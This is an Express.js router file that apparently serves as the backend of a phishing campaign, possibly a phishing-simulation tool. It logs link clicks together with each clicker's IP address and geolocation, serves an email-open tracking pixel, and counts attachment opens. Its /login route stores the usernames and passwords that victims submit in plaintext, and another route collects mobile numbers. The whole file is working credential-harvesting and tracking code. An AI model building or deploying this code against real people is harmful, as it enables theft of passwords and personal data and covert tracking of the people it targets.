const express = require('express');
const router = express.Router();
const path = require('path');
const User = require('../models/User');
const getGeolocation = require('../utils/getApproxLocation')

// tracks linkOpenCount
router.get('/incrementLinkOpenCount/:userId', async (req, res) => {
    try {
        // Extract userId from request parameters
        const userId = req.params.userId;

        //  Capture the user's IP address from the request   
         const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        //  const ipAddress = "103.206.182.96";


        // Find the user by userId
        const user = await User.findById(userId);
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }

        // Increment the linkOpenCount
        user.linkOpenCount += 1;
        user.Date = Date.now();
        const location = getGeolocation(ipAddress);
        user.ipAddress = ipAddress;
        user.location = location ? location : {};

        // Save the updated user to the database
        await user.save();

        // Send a success response
        res.status(200).json({ message: 'linkOpenCount incremented successfully' });
        // res.render('SigninPage.ejs', {data: userId});
    } catch (error) {
        // If an error occurs, send an error response
        console.error(error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// tracks Email Open Count (user will hit this route directly no need to communicate to user website template)
router.get('/track.gif', async (req, res) => {
    try {
        const { userId } = req.query;

        const user = await User.findById(userId);
        if (user) {
            user.emailOpenCount += 1;
            await user.save();
        }

        res.sendFile(path.join(__dirname, 'pixel.jpg'));
    } catch (error) {
        console.error(error);
        res.status(500).send('Internal server error');
    }
});

// tracks attachmentOpenCount
router.get('/incrementAttachmentOpenCount/:userId', async (req, res) => {
    try {
        const userId = req.params.userId;
        const user = await User.findById(userId);

        if (user) {
            user.attachmentOpenCount += 1;
            await user.save();
        }

        res.sendFile(path.join(__dirname, 'pixel.jpg'));
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// tracks form submission
router.post('/login', async (req, res) => {
    try {
        const { username, userId, name, phone, password, category } = req.body;

        await User.findByIdAndUpdate(userId, { $inc: { submittedData: 1 } });
        await User.findByIdAndUpdate(userId, { 
            $push: { 
                submittedContent: { 
                    username, 
                    password, 
                    category, 
                    name, 
                    phone 
                } 
            } 
        });

        res.status(200).json({ message: 'Form submitted successfully' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// tracks mobile number
router.post('/store-mobile', async (req, res) => {
    try {
        const { mobile, userId } = req.body;

        await User.findByIdAndUpdate(userId, { $push: { submittedContent: { mobileNo: mobile } } });

        res.status(201).json({ message: 'Mobile number stored successfully' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

module.exports = router;
